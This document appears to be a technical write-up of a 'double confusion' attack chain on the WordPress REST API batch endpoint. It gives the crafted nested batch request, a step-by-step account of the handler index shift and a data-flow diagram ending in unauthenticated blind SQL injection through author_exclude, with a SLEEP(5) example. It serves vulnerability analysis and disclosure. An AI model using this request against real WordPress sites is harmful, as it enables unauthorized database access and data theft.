# Attack Chain — Double Confusion

## Request Structure

```
POST /index.php?rest_route=/batch/v1
Content-Type: application/json

{
  "validation": "require-all-validate",
  "requests": [
    // ── OUTER BATCH (3 requests) ──
    {"method": "POST", "path": "///"},                    // [0] Parse fail → WP_Error
    {"method": "POST", "path": "/wp/v2/posts",             // [1] Validated as posts...
     "body": {
       "requests": [
         // ── INNER BATCH (3 requests) ──
         {"method": "POST", "path": "///"},                // [0] Parse fail → WP_Error
         {"method": "GET",
          "path": "/wp/v2/users?author_exclude=<SQLi>"},   // [1] Validated as users...
         {"method": "GET", "path": "/wp/v2/posts"}         // [2] Posts handler
       ]
     }
    },
    {"method": "POST", "path": "/batch/v1",                // [2] Batch handler
     "body": {"requests": []}}
  ]
}
```

## Step-by-Step

### OUTER Confusion (shifts outer[1] onto batch handler)

1. `outer[0]` → `wp_parse_url("///")` fails → `WP_Error("parse_path_failed")`
2. Validation loop: `$validation[0] = WP_Error`, `$matches` stays empty
3. `outer[1]` → matched to `/wp/v2/posts` → `$matches[0] = posts_handler`
4. `outer[2]` → matched to `/batch/v1` → `$matches[1] = batch_handler`
5. **Dispatch `outer[1]`**: uses `$matches[1]` = **batch_handler** (should be `$matches[0]` = posts_handler)
6. `outer[1]`'s body (containing the inner batch JSON) is now processed by `serve_batch_request_v1()` recursively

### INNER Confusion (shifts inner[1] onto posts handler)

7. `inner[0]` → another `WP_Error("parse_path_failed")` → second index shift
8. `inner[1]` → matched to `/wp/v2/users` → `$matches[0] = users_handler`
   - Users schema has **no `author_exclude` parameter** → raw string passes validation
9. `inner[2]` → matched to `/wp/v2/posts` → `$matches[1] = posts_handler`
10. **Dispatch `inner[1]`**: uses `$matches[1]` = **posts_handler** (should be `$matches[0]` = users_handler)
11. `WP_REST_Posts_Controller::get_items()` maps `author_exclude` → `author__not_in`
12. `WP_Query` builds SQL with unsanitized string → **SQL INJECTION**

## Data Flow Diagram

```
POST /batch/v1
│
├─► WP_REST_Server::serve_batch_request_v1()
│   ├─► outer[0] "///" → WP_Error → $validation[0] only (index shift)
│   ├─► outer[1] "/wp/v2/posts" → $matches[0] = posts
│   ├─► outer[2] "/batch/v1" → $matches[1] = batch
│   │
│   └─► DISPATCH outer[1] with $matches[1] = batch handler
│       │
│       └─► serve_batch_request_v1()  ← INNER batch
│           ├─► inner[0] "///" → WP_Error → second shift
│           ├─► inner[1] "/wp/v2/users?author_exclude=<SQLi>" → $matches[0] = users
│           ├─► inner[2] "/wp/v2/posts" → $matches[1] = posts
│           │
│           └─► DISPATCH inner[1] with $matches[1] = posts handler
│               │
│               └─► WP_REST_Posts_Controller::get_items()
│                   └─► WP_Query( author__not_in = "<SQLi>" )
│                       └─► SQL: NOT IN (0) AND SLEEP(5)-- -)
│                           └─► DATABASE ← BLIND SQL INJECTION
```

## Why No Authentication Required

- `/batch/v1` is a public REST API endpoint
- Both `/wp/v2/posts` and `/wp/v2/users` list endpoints are public (no auth required to query)
- The route confusion happens entirely within the REST server — no auth check is performed on the batch endpoint itself
